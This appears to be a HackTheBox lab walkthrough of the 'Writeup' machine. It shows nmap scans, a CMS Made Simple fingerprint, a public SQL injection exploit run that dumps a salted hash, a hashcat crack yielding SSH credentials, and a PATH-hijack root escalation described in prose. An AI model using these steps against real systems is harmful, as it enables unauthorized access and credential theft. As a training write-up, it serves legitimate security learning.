# Writeup Hackthebox Walkthrough

## All Ports Scan

```bash
# Nmap 7.91 scan initiated Fri Jul  2 12:16:02 2021 as: nmap -T4 -sT -vv -p- -oA nmap/allport 10.10.10.138
Nmap scan report for 10.10.10.138
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2021-07-02 12:16:02 -06 for 161s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jul  2 12:18:43 2021 -- 1 IP address (1 host up) scanned in 161.25 seconds

```

## Complete Scan

```bash
# Nmap 7.91 scan initiated Fri Jul  2 12:20:14 2021 as: nmap -T4 -sT -sV -sC -A -vv -p22,80 -oA nmap/complete 10.10.10.138
Nmap scan report for 10.10.10.138
Host is up, received echo-reply ttl 63 (0.24s latency).
Scanned at 2021-07-02 12:20:15 -06 for 20s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKBbBK0GkiCbxmAbaYsF4DjDQ3JqErzEazl3v8OndVhynlxNA5sMnQmyH+7ZPdDx9IxvWFWkdvPDJC0rUj1CzOTOEjN61Qd7uQbo5x4rJd3PAgqU21H9NyuXt+T1S/Ud77xKei7fXt5kk1aL0/mqj8wTk6HDp0ZWrGBPCxcOxfE7NBcY3W++IIArn6irQUom0/AAtR3BseOf/VTdDWOXk/Ut3rrda4VMBpRcmTthjsTXAvKvPJcaWJATtRE2NmFjBWixzhQU+s30jPABHcVtxl/Fegr3mvS7O3MpPzoMBZP6Gw8d/bVabaCQ1JcEDwSBc9DaLm4cIhuW37dQDgqT1V
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPzrVwOU0bohC3eXLnH0Sn4f7UAwDy7jx4pS39wtkKMF5j9yKKfjiO+5YTU//inmSjlTgXBYNvaC3xfOM/Mb9RM=
80/tcp open  http    syn-ack Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=7/2%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=60DF58F3%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10A%TI=Z%II=I%TS=8)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.052 days (since Fri Jul  2 11:05:17 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   245.14 ms 10.10.14.1
2   245.23 ms 10.10.10.138

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  2 12:20:35 2021 -- 1 IP address (1 host up) scanned in 21.34 seconds
```

## Port 80 Enumeration

![](Images/Pasted%20image%2020210702235004.png)

As nmap shows we got a writeup entry in robots.txt

![](Images/Pasted%20image%2020210702235244.png)

Nothing found special so i look forward to check the CMS of or the backend method because the website is using .php

```java
┌─[R4hn1]─[10.10.14.137]─[root@V0ld3rm0rt]─[~/Walkthrough/HTB/Writeup]
└────╼ # whatweb http://10.10.10.138/writeup/
http://10.10.10.138/writeup/ [200 OK] Apache[2.4.25], CMS-Made-Simple, Cookies[CMSSESSID9d372ef93962], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.138], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.], Title[Home - writeup]
```

Here whatweb shows it is running on the CMS Made Simple - Copyright (C) 2004-2019.

While searching for exploit it shows it is vulnerable to SQLi

![](Images/Pasted%20image%2020210703014832.png)

But the exploit was not working because of some liberary not available for python2,
So i changes some things to work without the liberaries and it works.

After running exploit we found this.

```java
┌─[R4hn1]─[10.10.14.137]─[root@V0ld3rm0rt]─[~/Walkthrough/HTB/Writeup]
└────╼ # python 46635.py -u http://10.10.10.138/writeup/

[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7', 'green')
```

![](Images/Pasted%20image%2020210703020142.png)

```java
┌─[R4hn1]─[10.10.14.137]─[root@V0ld3rm0rt]─[~/Walkthrough/HTB/Writeup]
└────╼ # hashcat -m 20 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

Credentials :
jkr:raykayjay9
```

So we are logged in with ssh.

![](Images/Pasted%20image%2020210703020329.png)

## Privelege Escalation

After Searching for sometime observer it is running /root/bin/cleanup.pl every minute.

I use pspy64 to monitor running services.

![](Images/Pasted%20image%2020210703024432.png)

But we can't do anything with that cause it is running with absolute path and we don't have previlege to read and write it.
So i look again the same process and one more thing

![](Images/Pasted%20image%2020210703031900.png)

While searing for the file observerd one more thing.

![](Images/Pasted%20image%2020210703031950.png)

First calling path is differnet and the file is calling from second path.
means we can manipulate this.

![](Images/Pasted%20image%2020210703032257.png)

We've noticed one more thing.

![](Images/Pasted%20image%2020210703032404.png)

And once i again logged in using ssh we got a root.

![](Images/Pasted%20image%2020210703032737.png)

